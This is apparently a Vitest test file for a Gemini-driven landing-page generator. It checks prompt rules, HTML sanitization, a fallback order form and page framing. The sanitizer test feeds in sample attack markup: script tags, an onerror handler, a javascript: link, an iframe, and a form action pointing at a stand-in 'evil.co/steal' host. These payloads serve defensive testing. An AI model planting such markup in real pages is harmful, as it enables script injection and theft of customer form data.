import { describe, it, expect } from "vitest";
import { designPrompt, ensureOrderForm, frameDocument, sanitizeDesign } from "../lib/gemini-design";

describe("landing Gemini de A à Z", () => {
  it("prompt : contrat du formulaire, photos exactes, pas de faux avis, darija RTL", () => {
    const p = designPrompt({
      name: "S11",
      price: 199,
      oldPrice: 299,
      language: "ar-MA",
      copy: { headline: "واش" },
      features: ["Charge sans fil"],
      images: [{ url: "https://x.co/a.png", role: "hero" }],
    });
    expect(p).toContain('<form data-lp-order id="order">');
    expect(p).toContain('name="phone"');
    expect(p).toContain("- hero: https://x.co/a.png");
    expect(p).toContain("NEVER invent customer reviews");
    expect(p).toContain('dir="rtl"');
  });
  it("nettoyage : scripts, événements, javascript:, iframes et action de formulaire retirés", () => {
    const raw =
      '```html\n<html><head><script>alert(1)</script><link rel="stylesheet" href="https://evil.co/x.css"><link href="https://fonts.googleapis.com/css2?family=Cairo" rel="stylesheet"></head>' +
      '<body><img src="a.png" onerror="alert(2)"><a href="javascript:alert(3)">x</a><iframe src="https://evil.co"></iframe>' +
      '<form data-lp-order action="https://evil.co/steal"><input name="phone"></form><script src="x.js"></script></body></html>\n```';
    const h = sanitizeDesign(raw);
    expect(h).not.toMatch(/<script|onerror|javascript:|<iframe|evil\.co/i);
    expect(h).toContain("fonts.googleapis.com");
    expect(h).toContain("<form data-lp-order>");
    expect(h.startsWith("<html")).toBe(true);
  });
  it("formulaire de secours si Gemini l'a oublié", () => {
    const h = ensureOrderForm("<html><body><h1>Page</h1></body></html>", "ar-MA", 199);
    expect(h).toMatch(/<form data-lp-order[\s\S]*name="phone"[\s\S]*199 DH[\s\S]*<\/body>/);
    const ok = "<form data-lp-order><input name=phone></form>";
    expect(ensureOrderForm(ok, "fr-MA", 1)).toBe(ok);
  });
  it("cadre : viewport + script de liaison ajoutés, un seul script", () => {
    const d = frameDocument("<html><head><style>a{}</style></head><body><p>x</p></body></html>");
    expect(d).toContain('name="viewport"');
    expect(d.match(/<script>/g)).toHaveLength(1);
    expect(d.indexOf("<script>")).toBeLessThan(d.indexOf("</body>"));
    expect(frameDocument("<p>x</p>")).toContain("<!doctype html>");
  });
});
